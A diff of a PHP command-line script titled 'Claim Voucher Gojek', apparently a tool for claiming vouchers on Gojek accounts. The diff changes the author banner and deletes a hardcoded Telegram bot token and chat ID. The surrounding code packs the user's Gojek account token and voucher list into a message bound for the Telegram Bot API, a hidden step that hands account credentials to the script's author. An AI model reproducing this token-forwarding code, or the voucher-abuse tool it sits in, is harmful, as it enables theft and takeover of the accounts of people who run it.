@@ -3,7 +3,7 @@ date_default_timezone_set('Asia/Jakarta');
 include "function.php";
 echo color("red"," ===========================\n");
 echo color("red","| Claim Voucher Gojek|\n");
-echo color("red","| Agungwiyohoho |\n");
+echo color("red","| AnggaF |\n");
 echo "| Time    :".date('[d-m-Y] [H:i:s]')."   |\n";
 echo " ===========================\n";
 
@@ -139,8 +139,7 @@ echo " ===========================\n";
         $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
         $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
         $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
-        $TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
-	$chatid = "785784404";
+      
 	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
 	$method	= "sendMessage";
 	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
